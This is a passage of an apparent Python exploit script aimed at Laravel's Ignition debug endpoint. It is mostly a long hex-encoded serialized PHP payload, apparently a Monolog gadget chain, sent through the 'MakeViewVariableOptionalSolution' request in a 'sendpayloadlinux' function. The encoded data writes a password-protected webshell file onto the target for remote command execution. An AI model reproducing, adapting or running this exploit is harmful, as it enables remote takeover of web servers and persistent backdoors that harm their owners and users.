49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def sendpayloadlinux ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=